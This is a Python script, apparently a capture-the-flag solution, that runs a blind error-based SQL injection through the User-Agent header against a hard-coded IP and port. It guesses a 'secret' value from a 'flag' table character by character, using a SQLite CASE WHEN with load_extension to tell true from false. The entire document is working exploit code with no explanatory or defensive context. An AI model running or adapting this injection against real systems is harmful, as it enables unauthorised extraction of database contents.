import requests

char = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm?+-1234567890_}{@!&|[$*]<>=^'

dtb = ''

for i in range(1,30):
   print(i)
   for ch in char: 
        burp0_url = "http://103.97.125.56:30210"
        burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "null',null,null,null,case when exists(SELECT * FROM flag WHERE id = 1 AND (SUBSTR(secret, {n}, 1) = '{c}')) THEN null ELSE load_extension(1) end) -- a".format(n=i, c=ch), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        r = requests.get(burp0_url, headers=burp0_headers)
        #print(burp0_headers)
        if 'Error' not in r.text:
            dtb = dtb + ch 
            print(dtb) 
            break